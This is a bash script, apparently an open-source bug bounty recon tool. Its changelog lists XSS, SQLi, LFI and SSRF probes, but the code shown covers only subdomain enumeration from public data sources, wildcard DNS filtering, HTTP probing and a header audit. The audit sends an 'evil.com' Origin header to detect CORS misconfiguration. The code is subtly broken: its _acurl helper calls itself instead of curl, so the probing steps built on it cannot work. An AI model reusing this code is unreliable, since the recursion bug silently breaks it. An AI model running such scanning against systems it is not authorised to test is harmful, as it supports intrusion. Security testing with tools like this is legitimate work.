#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════
#  NYXORA v3.0  —  Zero-Dependency Bug Bounty Recon Framework
#  GitHub : https://github.com/thivyas111-pixel/nyxora
#
#  Requires ONLY: bash curl awk grep sort sed tr wc md5sum
#
#  v3.0 Improvements over v2.0:
#    FIX  Array-export bug: JS_PATTERNS, GRAPHQL_PATHS, API_VERSIONS now
#         serialized to temp files — bash can't export arrays
#    FIX  set -u crashes in subshells with unbound vars → guarded with ${var:-}
#    FIX  _parallel(): explicit while-read loop fix + correct semaphore drain
#    FIX  Wildcard entropy: /dev/urandom fallback; 4-probe consensus
#    FIX  CORS: null-origin + pre-flight OPTIONS probe added
#    FIX  XSS body-split: replaced brittle awk with sed '/^\r*$/,$!d'
#    FIX  SQLi URL-encoding: replaced complex awk with printf|sed chain
#    FIX  WILDCARD_IP/BODY_HASH exported AFTER being set (was before)
#    FIX  _takeover_check: declare -A inside subshell replaced with case/grep
#    FIX  _graphql_probe: single curl call with -w for status + body
#    FIX  _api_version_probe: single curl call per endpoint
#    FIX  count_safe: tr -d ' \n' on wc output to strip whitespace
#    FIX  _crawl_host: mktemp files cleaned up on EXIT trap per subshell
#    FIX  XSS canary: uses random bytes, not just date +%s
#    FIX  IDOR: lightweight baseline size gate before 7-probe sequence
#    FIX  LFI: pre-filter by param keyword before _parallel (not inside fn)
#    FIX  Redirect: also tests http:// scheme payload
#    FIX  Temp-file naming: uses mktemp instead of /tmp/name_$$
#    FIX  HTML _js_array: escapes <, >, &, ', / in addition to \ and "
#    ADD  DNS fallback: host/dig resolution when HTTP probe returns nothing
#    ADD  Retry + jitter: _curl_retry wrapper with exponential backoff
#    ADD  HTTPS-only probe: detects HTTP→HTTPS redirectors correctly
#    ADD  Null-byte / truncation probes in LFI payloads
#    ADD  --rate-limit <n>  flag: ms sleep between requests per worker
#    ADD  404 canary validation: fake-path baseline to detect custom 404s
#    ADD  Open redirect: tests both //, http://, data: payloads
#    ADD  SSRF redirect-chain confirmation (follows 3xx from SSRF probe)
#    ADD  Version string in JSON stats
#    IMPROVED  Diff engine: spread threshold raised; empty-body guard added
#    IMPROVED  Takeover: 35 signatures; 200/403 check uses body-size gate
#    IMPROVED  JS scanner: skip FUZZ placeholder URLs; null/undefined guard
#
#  v3.1 Improvements over v3.0:
#    ADD  --cookie <string>  flag: session cookie for authenticated scanning
#    ADD  --header <string>  flag: arbitrary auth header (repeatable)
#    ADD  _acurl helper: all probe functions now carry auth credentials
#    ADD  AUTH_HEADERS_FILE: array serialised to tmp file for subshell export
#    FIX  XSS: second-request confirmation probe eliminates non-deterministic
#         reflections; comment-context gate added; ctx detected before conf
#    FIX  _acurl used consistently across _http_probe, _header_audit,
#         _takeover_check, _js_scan, _graphql_probe, _method_check,
#         _hostinj_check, _cache_hint, _api_version_probe, _baseline_check,
#         _diff_check, _idor_check, _xss_check, _redirect_check,
#         _sqli_check, _lfi_check, _ssrf_oob_probe
# ═══════════════════════════════════════════════════════════════════════════

# ── Safe mode ─────────────────────────────────────────────────────────────
# Do NOT use -u globally: exported functions run in subshells where any
# unbound variable from the parent causes an immediate crash.  We guard
# every variable reference with ${var:-} instead.
set -o pipefail
IFS=$'\n\t'

VERSION="3.1.0"

RED='\033[0;31m'; ORANGE='\033[0;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BLUE='\033[0;34m'; MAGENTA='\033[0;35m'
BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'

print_banner() {
cat << 'EOF'

  ███╗   ██╗██╗   ██╗██╗  ██╗ ██████╗ ██████╗  █████╗
  ████╗  ██║╚██╗ ██╔╝╚██╗██╔╝██╔═══██╗██╔══██╗██╔══██╗
  ██╔██╗ ██║ ╚████╔╝  ╚███╔╝ ██║   ██║██████╔╝███████║
  ██║╚██╗██║  ╚██╔╝   ██╔██╗ ██║   ██║██╔══██╗██╔══██║
  ██║ ╚████║   ██║   ██╔╝ ██╗╚██████╔╝██║  ██║██║  ██║
  ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
  v3.1  ·  Zero-Dependency Bug Bounty Recon Framework

EOF
  echo -e "  ${DIM}curl · bash · awk · grep — nothing to install.${RESET}"
  echo -e "  ${MAGENTA}30 Secrets · 35 Takeovers · Host Injection · LFI · GraphQL · Method Enum${RESET}"
  echo
}

usage() {
  echo -e "${BOLD}Usage:${RESET}  $0 <domain> [options]"
  echo
  echo -e "${BOLD}Options:${RESET}"
  echo "  --deep               Deeper crawl (more sources, depth 3)"
  echo "  --out <dir>          Custom output directory"
  echo "  --no-report          Skip HTML report"
  echo "  --threads <n>        Parallel workers (default: 20)"
  echo "  --timeout <n>        Per-request timeout seconds (default: 6)"
  echo "  --rate-limit <ms>    Sleep ms between requests per worker (default: 0)"
  echo "  --scope-file <file>  Only test subdomains listed in file"
  echo "  --oob <host>         OOB host for active SSRF/blind injection probes"
  echo "  --cookie <string>    Session cookie(s) for authenticated scanning (e.g. 'session=abc123')"
  echo "  --header <string>    Extra HTTP header for auth (e.g. 'Authorization: Bearer TOKEN')"
  echo "                       May be specified multiple times"
  echo "  --help               Show this help"
  echo
  exit 0
}

DOMAIN=""; DEEP_MODE=false; CUSTOM_OUT=""; SKIP_REPORT=false
THREADS=20; TIMEOUT=6; SCOPE_FILE=""; OOB_HOST=""; RATE_LIMIT_MS=0
AUTH_COOKIE=""; AUTH_HEADERS=()

while [[ $# -gt 0 ]]; do
  case "$1" in
    --deep)        DEEP_MODE=true; shift ;;
    --no-report)   SKIP_REPORT=true; shift ;;
    --out)         CUSTOM_OUT="$2"; shift 2 ;;
    --threads)     THREADS="$2"; shift 2 ;;
    --timeout)     TIMEOUT="$2"; shift 2 ;;
    --rate-limit)  RATE_LIMIT_MS="$2"; shift 2 ;;
    --scope-file)  SCOPE_FILE="$2"; shift 2 ;;
    --oob)         OOB_HOST="$2"; shift 2 ;;
    --cookie)      AUTH_COOKIE="$2"; shift 2 ;;
    --header)      AUTH_HEADERS+=("$2"); shift 2 ;;
    --help|-h)     print_banner; usage ;;
    -*)            echo "Unknown option: $1"; exit 1 ;;
    *)             [[ -z "${DOMAIN}" ]] && DOMAIN="$1" || { echo "Unexpected: $1"; exit 1; }; shift ;;
  esac
done

[[ -z "${DOMAIN}" ]] && { print_banner; usage; }
command -v curl &>/dev/null || { echo -e "${RED}[!] curl not found.${RESET}"; exit 1; }

DOMAIN="${DOMAIN,,}"; DOMAIN="${DOMAIN#http://}"; DOMAIN="${DOMAIN#https://}"; DOMAIN="${DOMAIN%%/*}"
START_TS=$(date +%s); START_DATE=$(date '+%Y-%m-%d %H:%M:%S')
[[ -n "${CUSTOM_OUT}" ]] && OUT="${CUSTOM_OUT}" || OUT="$HOME/nyxora-$DOMAIN-$(date +%Y%m%d-%H%M)"
mkdir -p "${OUT}"/{subs,http,crawl,engine/{diff,behavior,reflection,headers,secrets,takeover,methods,lfi,hostinj,graphql,cache},final,logs,tmp}
LOGFILE="${OUT}/logs/run.log"; STATS_FILE="${OUT}/logs/stats.json"
TMPDIR_NYX="${OUT}/tmp"   # All temp files go here; cleaned at end

log()     { local ts="[$(date +%T)]"; echo -e "${CYAN}${ts}${RESET} ${GREEN}[+]${RESET} $*"; echo "$ts [+] $*" >> "${LOGFILE}"; }
warn()    { local ts="[$(date +%T)]"; echo -e "${CYAN}${ts}${RESET} ${ORANGE}[!]${RESET} $*"; echo "$ts [!] $*" >> "${LOGFILE}"; }
good()    { local ts="[$(date +%T)]"; echo -e "${CYAN}${ts}${RESET} ${MAGENTA}[★]${RESET} $*"; echo "$ts [★] $*" >> "${LOGFILE}"; }
section() { echo; echo -e "${BOLD}${BLUE}┌──────────────────────────────────────────────────┐${RESET}"; echo -e "${BOLD}${BLUE}│  $*${RESET}"; echo -e "${BOLD}${BLUE}└──────────────────────────────────────────────────┘${RESET}"; }
die()     { warn "$*"; exit 1; }

# ── Auth helpers ──────────────────────────────────────────────────────────
# Serialize AUTH_HEADERS array to a file (bash arrays cannot be exported)
AUTH_HEADERS_FILE="${OUT}/tmp/auth_headers.txt"
mkdir -p "${OUT}/tmp"
: > "${AUTH_HEADERS_FILE}"
for _ah in "${AUTH_HEADERS[@]+"${AUTH_HEADERS[@]}"}"; do
  printf '%s\n' "${_ah}" >> "${AUTH_HEADERS_FILE}"
done
export AUTH_COOKIE AUTH_HEADERS_FILE

# Build curl auth flags from cookie + header file
# Usage: _auth_flags — outputs curl args to be eval'd or passed via array
_auth_flags() {
  [[ -n "${AUTH_COOKIE:-}" ]] && printf -- '-H\0Cookie: %s\0' "${AUTH_COOKIE}"
  [[ -s "${AUTH_HEADERS_FILE:-/dev/null}" ]] || return
  while IFS= read -r _h; do
    [[ -z "${_h}" ]] && continue
    printf -- '-H\0%s\0' "${_h}"
  done < "${AUTH_HEADERS_FILE}"
}
export -f _auth_flags

# _acurl: drop-in curl replacement for probe functions — includes auth headers
# All exported probe functions should use _acurl instead of raw curl
_acurl() {
  local -a _af=()
  while IFS= read -r -d '' _flag; do _af+=("${_flag}"); done < <(_auth_flags 2>/dev/null)
  _acurl "${_af[@]+"${_af[@]}"}" "$@" 2>/dev/null
}
export -f _acurl

# count_safe: strip all whitespace from wc -l output (some systems add spaces)
count_safe() { [[ -f "$1" ]] && wc -l < "$1" | tr -d ' \n' || echo "0"; }

# ── Random token (no date collision in parallel workers) ──────────────────
_rand_token() {
  local n="${1:-8}"
  # Prefer /dev/urandom; fall back to $RANDOM mix
  if [[ -r /dev/urandom ]]; then
    tr -dc 'a-z0-9' < /dev/urandom 2>/dev/null | head -c "${n}" || true
  fi
  # If empty (e.g., sandboxed), use RANDOM
  local r; r=$(printf '%04x%04x' $RANDOM $RANDOM $RANDOM $RANDOM)
  echo "${r:0:${n}}"
}

# ── Rate-limit sleep ──────────────────────────────────────────────────────
_rate_sleep() {
  local ms="${RATE_LIMIT_MS:-0}"
  [[ "${ms}" -gt 0 ]] && sleep "$(echo "scale=3; ${ms}/1000" | bc 2>/dev/null || echo "0")" || true
}

# ── Parallel runner ───────────────────────────────────────────────────────
# Fixed: proper semaphore; works on empty input; no hang
_parallel() {
  local n="$1"; shift
  local fn="$1"; shift
  local -a extra_args=("$@")
  local -a pids=()
  local line
  while IFS= read -r line || [[ -n "${line}" ]]; do
    "${fn}" "${line}" "${extra_args[@]}" &
    pids+=("$!")
    while [[ ${#pids[@]} -ge ${n} ]]; do
      wait "${pids[0]}" 2>/dev/null || true
      pids=("${pids[@]:1}")
    done
  done
  for pid in "${pids[@]}"; do wait "${pid}" 2>/dev/null || true; done
}

# ── Curl wrappers ─────────────────────────────────────────────────────────
_UA="Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"

_curl() {
  local -a _af=()
  while IFS= read -r -d '' _flag; do _af+=("${_flag}"); done < <(_auth_flags)
  curl -skL --max-time "${TIMEOUT:-6}" --retry 1 --retry-delay 1 --connect-timeout 4 \
    -H "User-Agent: ${_UA}" "${_af[@]+"${_af[@]}"}" "$@" 2>/dev/null
}

# Retry wrapper with exponential backoff (max 2 retries)
_curl_retry() {
  local attempt out
  local -a _af=()
  while IFS= read -r -d '' _flag; do _af+=("${_flag}"); done < <(_auth_flags)
  for attempt in 1 2 3; do
    out=$(curl -skL --max-time "${TIMEOUT:-6}" --connect-timeout 4 \
      -H "User-Agent: ${_UA}" "${_af[@]+"${_af[@]}"}" "$@" 2>/dev/null) && echo "${out}" && return 0
    sleep $((attempt * 2))
  done
  return 1
}

print_banner

# ════════════════════════════════════════════════════════════════════════════
section "STEP 0 ─ Dependency Check"
ALL_OK=true
for tool in curl bash awk grep sort sed tr wc md5sum; do
  command -v "${tool}" &>/dev/null \
    && echo -e "  ${GREEN}✓${RESET} ${tool}" \
    || { echo -e "  ${RED}✗${RESET} ${tool} MISSING"; ALL_OK=false; }
done
${ALL_OK} || die "Missing tools above — they ship with every Linux distro."
echo -e "\n  ${GREEN}${BOLD}All OK. Starting...${RESET}"
log "Target: ${DOMAIN} | Out: ${OUT} | Mode: ${DEEP_MODE} | Threads: ${THREADS} | Timeout: ${TIMEOUT}s | RateLimit: ${RATE_LIMIT_MS}ms"
[[ -n "${OOB_HOST}" ]] && log "OOB: ${OOB_HOST}"
[[ -n "${AUTH_COOKIE}" ]] && log "Auth: cookie set (${#AUTH_COOKIE} chars)"
[[ ${#AUTH_HEADERS[@]} -gt 0 ]] && log "Auth: ${#AUTH_HEADERS[@]} extra header(s) set"

# ════════════════════════════════════════════════════════════════════════════
section "STEP 1 ─ Subdomain Enumeration (12+ sources)"
touch "${OUT}/subs/raw.txt"

log "crt.sh..."
_curl "https://crt.sh/?q=%25.${DOMAIN}&output=json" \
  | grep -oP '"name_value":"\K[^"]+' | tr ',' '\n' | sed 's/^\*\.//' >> "${OUT}/subs/raw.txt" &

log "AlienVault OTX..."
_curl "https://otx.alienvault.com/api/v1/indicators/domain/${DOMAIN}/passive_dns" \
  | grep -oP '"hostname":"\K[^"]+' | grep "\.${DOMAIN}$" >> "${OUT}/subs/raw.txt" &

log "HackerTarget..."
_curl "https://api.hackertarget.com/hostsearch/?q=${DOMAIN}" \
  | cut -d',' -f1 | grep "\.${DOMAIN}$" >> "${OUT}/subs/raw.txt" &

log "RapidDNS..."
_curl "https://rapiddns.io/subdomain/${DOMAIN}?full=1&down=1" \
  | grep -oP '(?<=<td>)[a-z0-9._-]+\.'${DOMAIN}'(?=</td>)' >> "${OUT}/subs/raw.txt" &

log "Wayback Machine..."
_curl "https://web.archive.org/cdx/search/cdx?url=*.${DOMAIN}&output=text&fl=original&collapse=urlkey" \
  | grep -oP 'https?://\K[^/]+' | grep "\.${DOMAIN}$" >> "${OUT}/subs/raw.txt" &

log "ThreatCrowd..."
_curl "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=${DOMAIN}" \
  | grep -oP '"[a-z0-9._-]+\.'${DOMAIN}'"' | tr -d '"' >> "${OUT}/subs/raw.txt" &

log "SecurityTrails (passive)..."
_curl "https://securitytrails.com/list/apex_domain/${DOMAIN}" \
  | grep -oP '[a-z0-9._-]+\.'${DOMAIN}'(?=[^a-z0-9._-])' >> "${OUT}/subs/raw.txt" &

log "URLScan..."
_curl "https://urlscan.io/api/v1/search/?q=domain:${DOMAIN}&size=100" \
  | grep -oP '"[a-z0-9._-]+\.'${DOMAIN}'"' | tr -d '"' >> "${OUT}/subs/raw.txt" &

log "ThreatMiner..."
_curl "https://api.threatminer.org/v2/domain.php?q=${DOMAIN}&rt=5" \
  | grep -oP '"[a-z0-9._-]+\.'${DOMAIN}'"' | tr -d '"' >> "${OUT}/subs/raw.txt" &

log "Riddler..."
_curl "https://riddler.io/search/exportcsv?q=pld:${DOMAIN}" \
  | cut -d',' -f6 | grep "\.${DOMAIN}$" >> "${OUT}/subs/raw.txt" &

log "DNSBufferOver..."
_curl "https://dns.bufferover.run/dns?q=.${DOMAIN}" \
  | grep -oP '"[a-z0-9._-]+\.'${DOMAIN}'"' | tr -d '"' >> "${OUT}/subs/raw.txt" &

log "Anubis DB..."
_curl "https://jldc.me/anubis/subdomains/${DOMAIN}" \
  | grep -oP '"[a-z0-9._-]+\.'${DOMAIN}'"' | tr -d '"' >> "${OUT}/subs/raw.txt" &

if [[ "${DEEP_MODE}" == true ]]; then
  log "Certspotter (deep)..."
  _curl "https://api.certspotter.com/v1/issuances?domain=${DOMAIN}&include_subdomains=true&expand=dns_names" \
    | grep -oP '"[a-z0-9._-]+\.'${DOMAIN}'"' | tr -d '"' >> "${OUT}/subs/raw.txt" &

  log "TLS BufferOver (deep)..."
  _curl "https://tls.bufferover.run/dns?q=.${DOMAIN}" \
    | grep -oP '"[a-z0-9._-]+\.'${DOMAIN}'"' | tr -d '"' >> "${OUT}/subs/raw.txt" &

  log "Wayback subdomains deep..."
  _curl "https://web.archive.org/cdx/search/cdx?url=*.${DOMAIN}/*&output=text&fl=original&collapse=urlkey&limit=10000" \
    | grep -oP 'https?://\K[^/]+' | grep "\.${DOMAIN}$" >> "${OUT}/subs/raw.txt" &

  log "crt.sh wildcard (deep)..."
  _curl "https://crt.sh/?q=.${DOMAIN}&output=json" \
    | grep -oP '"name_value":"\K[^"]+' | tr ',' '\n' | sed 's/^\*\.//' >> "${OUT}/subs/raw.txt" &

  log "SonarSearch (deep)..."
  _curl "https://sonar.omnisint.io/subdomains/${DOMAIN}" \
    | grep -oP '"[a-z0-9._-]+\.'${DOMAIN}'"' | tr -d '"' >> "${OUT}/subs/raw.txt" &

  log "SynapsInt (deep)..."
  _curl "https://synapsint.com/report.php?name=https%3A%2F%2F${DOMAIN}" \
    | grep -oP '[a-z0-9._-]+\.'${DOMAIN}'(?=[^a-z0-9._-])' >> "${OUT}/subs/raw.txt" &
fi
wait

# Clean & deduplicate
sort -u "${OUT}/subs/raw.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' \
  | grep -E "^[a-z0-9][a-z0-9._-]*\.${DOMAIN}$" | grep -v '\.\.' | grep -v "^${DOMAIN}$" \
  | sort -u > "${OUT}/subs/raw_clean.txt"
mv "${OUT}/subs/raw_clean.txt" "${OUT}/subs/raw.txt"

if [[ -n "${SCOPE_FILE}" && -f "${SCOPE_FILE}" ]]; then
  grep -Fxf "${SCOPE_FILE}" "${OUT}/subs/raw.txt" > "${OUT}/subs/scoped.txt"
  mv "${OUT}/subs/scoped.txt" "${OUT}/subs/raw.txt"
  log "Scope filter applied"
fi
log "Raw subdomains: $(count_safe "${OUT}/subs/raw.txt")"
echo "${DOMAIN}" >> "${OUT}/subs/raw.txt"
sort -u "${OUT}/subs/raw.txt" -o "${OUT}/subs/raw.txt"

# ════════════════════════════════════════════════════════════════════════════
section "STEP 2 ─ DNS Resolution + Wildcard Pruning (body-hash aware)"
touch "${OUT}/subs/wildcard_ips.txt"
WILDCARD_IP=""; WILDCARD_BODY_HASH=""
_wc_ips=(); _wc_hashes=()

# 4 probes for better consensus; urandom-based names to avoid timing collisions
for _i in 1 2 3 4; do
  _rand="nonexistent-nyx-$(_rand_token 10)-${_i}.${DOMAIN}"
  _ip=$(curl -sk --max-time 5 --connect-timeout 3 -o /dev/null -w "%{remote_ip}" \
    "http://${_rand}" 2>/dev/null || true)
  _body=$(curl -sk --max-time 5 --connect-timeout 3 "http://${_rand}" 2>/dev/null \
    | md5sum | cut -d' ' -f1)
  [[ -n "${_ip}" && "${_ip}" != "0.0.0.0" ]] && _wc_ips+=("${_ip}")
  [[ -n "${_body}" ]] && _wc_hashes+=("${_body}")
done

if [[ ${#_wc_ips[@]} -ge 3 ]]; then
  _sorted_wc=$(printf '%s\n' "${_wc_ips[@]}" | sort | uniq -c | sort -rn | awk '$1>=3{print $2}' | head -1)
  if [[ -n "${_sorted_wc}" ]]; then
    WILDCARD_IP="${_sorted_wc}"
    WILDCARD_BODY_HASH=$(printf '%s\n' "${_wc_hashes[@]}" | sort | uniq -c | sort -rn | awk '$1>=3{print $2}' | head -1)
    warn "Wildcard IP confirmed: ${WILDCARD_IP} | body-hash: ${WILDCARD_BODY_HASH:0:8}..."
    echo "${WILDCARD_IP}" > "${OUT}/subs/wildcard_ips.txt"
  fi
fi
[[ -z "${WILDCARD_IP}" ]] && warn "No wildcard detected — keeping all resolved subdomains"

# Export after setting (v2 bug: exported before assignment)
export TIMEOUT WILDCARD_IP WILDCARD_BODY_HASH DOMAIN TMPDIR_NYX RATE_LIMIT_MS _UA

_resolve_and_filter() {
  local host="$1"
  local ip body_hash

  _rate_sleep 2>/dev/null || true

  ip=$(curl -sk --max-time 5 --connect-timeout 3 -o /dev/null -w "%{remote_ip}" \
    "http://${host}" 2>/dev/null || true)

  # Fallback: try HTTPS if HTTP returned nothing
  if [[ -z "${ip}" || "${ip}" == "0.0.0.0" ]]; then
    ip=$(curl -sk --max-time 5 --connect-timeout 3 -o /dev/null -w "%{remote_ip}" \
      "https://${host}" 2>/dev/null || true)
  fi

  # Fallback: try dig if available
  if [[ -z "${ip}" || "${ip}" == "0.0.0.0" ]]; then
    if command -v dig &>/dev/null; then
      ip=$(dig +short "${host}" 2>/dev/null | grep -E '^[0-9]+\.' | head -1 || true)
    elif command -v host &>/dev/null; then
      ip=$(host "${host}" 2>/dev/null | grep 'has address' | awk '{print $NF}' | head -1 || true)
    fi
    [[ -n "${ip}" ]] && echo "${host} ${ip}"; return
  fi

  if [[ -n "${WILDCARD_IP:-}" && "${ip}" == "${WILDCARD_IP}" ]]; then
    body_hash=$(curl -sk --max-time 5 --connect-timeout 3 "http://${host}" 2>/dev/null \
      | md5sum | cut -d' ' -f1)
    [[ -n "${WILDCARD_BODY_HASH:-}" && "${body_hash}" == "${WILDCARD_BODY_HASH}" ]] && return

    local real_sz rand_sz diff_size wc_rand
    wc_rand="nyx-verify-$(_rand_token 8).${DOMAIN}"
    real_sz=$(curl -sk --max-time 5 --connect-timeout 3 "http://${host}" 2>/dev/null | wc -c | tr -d ' ')
    rand_sz=$(curl -sk --max-time 5 --connect-timeout 3 "http://${wc_rand}" 2>/dev/null | wc -c | tr -d ' ')
    diff_size=$(( real_sz > rand_sz ? real_sz - rand_sz : rand_sz - real_sz ))
    [[ "${diff_size}" -lt 500 ]] && return
  fi

  echo "${host} ${ip}"
}
export -f _resolve_and_filter _rate_sleep _rand_token

cat "${OUT}/subs/raw.txt" | _parallel "${THREADS}" _resolve_and_filter 2>/dev/null \
  | sort -u > "${OUT}/subs/resolved_raw.txt"

# Cluster IPs that appear > 8 times as additional wildcard candidates
awk '{print $2}' "${OUT}/subs/resolved_raw.txt" | sort | uniq -c | sort -rn \
  | awk '$1 > 8 {print $2}' >> "${OUT}/subs/wildcard_ips.txt"
sort -u "${OUT}/subs/wildcard_ips.txt" -o "${OUT}/subs/wildcard_ips.txt"

if [[ -s "${OUT}/subs/wildcard_ips.txt" ]] && grep -qE '^[0-9]' "${OUT}/subs/wildcard_ips.txt" 2>/dev/null; then
  grep -vFf <(grep -E '^[0-9]' "${OUT}/subs/wildcard_ips.txt") "${OUT}/subs/resolved_raw.txt" \
    | awk '{print $1}' | sort -u > "${OUT}/subs/resolved.txt"
else
  awk '{print $1}' "${OUT}/subs/resolved_raw.txt" | sort -u > "${OUT}/subs/resolved.txt"
fi

# Safety: if pruning removed everything, fall back
if [[ ! -s "${OUT}/subs/resolved.txt" && -s "${OUT}/subs/resolved_raw.txt" ]]; then
  warn "Wildcard pruning removed all hosts — falling back to full resolved list"
  awk '{print $1}' "${OUT}/subs/resolved_raw.txt" | sort -u > "${OUT}/subs/resolved.txt"
fi
log "Resolved (wildcard-filtered): $(count_safe "${OUT}/subs/resolved.txt")"

# ════════════════════════════════════════════════════════════════════════════
section "STEP 3 ─ HTTP Probing"

# Pre-compute a 404-canary path to distinguish real pages from custom 404 pages
CANARY_404_PATH="/nyxora-fake-$(_rand_token 12)-notfound"
export CANARY_404_PATH

_http_probe() {
  local host="$1"
  local url raw status size title tech

  _rate_sleep 2>/dev/null || true

  for scheme in https http; do
    url="${scheme}://${host}"
    raw=$(_acurl -L --max-redirs 3 -D - -w "\n__STATUS__%{http_code}__SIZE__%{size_download}" "${url}") || continue

    status=$(echo "${raw}" | grep -oP '__STATUS__\K[0-9]+' | tail -1)
    [[ -z "${status}" || "${status}" == "000" ]] && continue
    echo "${status}" | grep -qE '^(200|201|301|302|307|401|403|500)$' || continue

    size=$(echo "${raw}" | grep -oP '__SIZE__\K[0-9]+' | tail -1)
    [[ "${size:-0}" -lt 200 ]] && continue

    # Custom-404 gate: fetch canary path and compare size
    local sz_canary
    sz_canary=$(_acurl -w "%{size_download}" -o /dev/null "${url}${CANARY_404_PATH}" || echo "0")
    # If canary returns same size as real page, it might be a catch-all 200
    if [[ "${status}" == "200" && "${sz_canary}" -gt 100 ]]; then
      local diff_404=$(( size > sz_canary ? size - sz_canary : sz_canary - size ))
      [[ "${diff_404}" -lt 200 ]] && continue
    fi

    title=$(echo "${raw}" | grep -oiP '(?<=<title>)[^<]+' | head -1 | tr -d '\r\n' | sed 's/  */ /g')
    title="${title:0:60}"
    tech=""
    echo "${raw}" | grep -qi "x-powered-by: php"    && tech="${tech}[PHP]"
    echo "${raw}" | grep -qi "x-powered-by: asp"    && tech="${tech}[ASP.NET]"
    echo "${raw}" | grep -qi "server: nginx"         && tech="${tech}[nginx]"
    echo "${raw}" | grep -qi "server: apache"        && tech="${tech}[Apache]"
    echo "${raw}" | grep -qi "server: iis"           && tech="${tech}[IIS]"
    echo "${raw}" | grep -qi "server: tomcat"        && tech="${tech}[Tomcat]"
    echo "${raw}" | grep -qi "server: lighttpd"      && tech="${tech}[lighttpd]"
    echo "${raw}" | grep -qi "wp-content"            && tech="${tech}[WordPress]"
    echo "${raw}" | grep -qi "drupal"                && tech="${tech}[Drupal]"
    echo "${raw}" | grep -qi "joomla"                && tech="${tech}[Joomla]"
    echo "${raw}" | grep -qi "cf-ray:"               && tech="${tech}[Cloudflare]"
    echo "${raw}" | grep -qi "x-amz-"               && tech="${tech}[AWS]"
    echo "${raw}" | grep -qi "x-goog-"              && tech="${tech}[GCP]"
    echo "${raw}" | grep -qi "x-azure-"             && tech="${tech}[Azure]"
    echo "${raw}" | grep -qi "x-sucuri-"            && tech="${tech}[Sucuri]"
    echo "${raw}" | grep -qi "x-fastly-"            && tech="${tech}[Fastly]"
    echo "${url} [${status}] [${size}b] ${title:+[${title}]} ${tech}"
    # Write to live list atomically via per-worker temp then merge
    local live_tmp="${TMPDIR_NYX}/live_${BASHPID}"
    echo "${url}" >> "${live_tmp}"
    return
  done
}
export -f _http_probe

cat "${OUT}/subs/resolved.txt" | _parallel "${THREADS}" _http_probe 2>/dev/null \
  | sort -u > "${OUT}/http/probe_full.txt"

# Merge per-worker live files
cat "${TMPDIR_NYX}"/live_* 2>/dev/null | sort -u > "${OUT}/http/live.txt"
rm -f "${TMPDIR_NYX}"/live_* 2>/dev/null || true

# Relaxed fallback
if [[ ! -s "${OUT}/http/live.txt" && -s "${OUT}/subs/resolved.txt" ]]; then
  warn "No live hosts with standard probe — trying relaxed probe..."
  _http_probe_relaxed() {
    local host="$1"
    local url status
    _rate_sleep 2>/dev/null || true
    for scheme in https http; do
      url="${scheme}://${host}"
      status=$(_acurl -o /dev/null -w "%{http_code}" "${url}") || continue
      [[ -z "${status}" || "${status}" == "000" ]] && continue
      echo "${status}" | grep -qE '^[2345]' || continue
      local live_tmp="${TMPDIR_NYX}/live_relax_${BASHPID}"
      echo "${url}" >> "${live_tmp}"
      echo "${url} [${status}]"; return
    done
  }
  export -f _http_probe_relaxed
  cat "${OUT}/subs/resolved.txt" | _parallel "${THREADS}" _http_probe_relaxed 2>/dev/null \
    | sort -u > "${OUT}/http/probe_full.txt"
  cat "${TMPDIR_NYX}"/live_relax_* 2>/dev/null | sort -u > "${OUT}/http/live.txt"
  rm -f "${TMPDIR_NYX}"/live_relax_* 2>/dev/null || true
fi

log "Live hosts: $(count_safe "${OUT}/http/live.txt")"
if [[ ! -s "${OUT}/http/live.txt" ]]; then
  warn "No live hosts found — continuing with recon data only."
  touch "${OUT}/http/live.txt"
fi

# ════════════════════════════════════════════════════════════════════════════
section "STEP 4 ─ Security Header Audit"

_header_audit() {
  local url="$1"
  local raw findings=""

  _rate_sleep 2>/dev/null || true

  # Primary probe with evil.com origin
  raw=$(_acurl -D - -o /dev/null -H "Origin: https://evil.com" "${url}") || return

  local status; status=$(echo "${raw}" | grep -oP 'HTTP/[0-9.]+ \K[0-9]+' | head -1)
  [[ "${status}" == "200" || "${status}" == "301" || "${status}" == "302" ]] || return

  # CORS — critical findings
  echo "${raw}" | grep -qi "access-control-allow-origin: \*"               && findings+="[CORS:WILDCARD] "
  echo "${raw}" | grep -qi "access-control-allow-origin: https://evil.com" && findings+="[CORS:REFLECTS_ORIGIN] "
  if echo "${raw}" | grep -qi "access-control-allow-credentials: true" && \
     echo "${raw}" | grep -qiE "access-control-allow-origin: (https://evil\.com|\*)"; then
    findings+="[CORS:CREDS_LEAK] "
  fi

  # Null-origin probe (separate request)
  local null_resp
  null_resp=$(_acurl -D - -o /dev/null -H "Origin: null" "${url}") || true
  echo "${null_resp}" | grep -qi "access-control-allow-origin: null" && findings+="[CORS:NULL_ORIGIN] "

  # Missing security headers
  echo "${raw}" | grep -qi "strict-transport-security"  || findings+="[MISSING:HSTS] "
  echo "${raw}" | grep -qi "x-frame-options"            || findings+="[MISSING:X-Frame-Options] "
  echo "${raw}" | grep -qi "x-content-type-options"     || findings+="[MISSING:X-Content-Type-Options] "
  echo "${raw}" | grep -qi "content-security-policy"    || findings+="[MISSING:CSP] "
  echo "${raw}" | grep -qi "referrer-policy"            || findings+="[MISSING:Referrer-Policy] "
  echo "${raw}" | grep -qi "permissions-policy"         || findings+="[MISSING:Permissions-Policy] "
  echo "${raw}" | grep -qi "cross-origin-opener-policy" || findings+="[MISSING:COOP] "

  # Cookie flags
  if echo "${raw}" | grep -qi "set-cookie:"; then
    echo "${raw}" | grep -iq "set-cookie:.*secure"   || findings+="[COOKIE:no-Secure] "
    echo "${raw}" | grep -iq "set-cookie:.*httponly" || findings+="[COOKIE:no-HttpOnly] "
    echo "${raw}" | grep -iq "set-cookie:.*samesite" || findings+="[COOKIE:no-SameSite] "
  fi

  # Info-disclosure
  echo "${raw}" | grep -qi "server: apache\|server: nginx\|server: iis\|server: tomcat\|x-powered-by:" && \
    findings+="[INFO:SERVER_DISCLOSURE] "

  [[ -n "${findings}" ]] && echo "${url} | ${findings}"
}
export -f _header_audit

cat "${OUT}/http/live.txt" | _parallel "${THREADS}" _header_audit 2>/dev/null \
  | sort -u > "${OUT}/engine/headers/audit.txt"
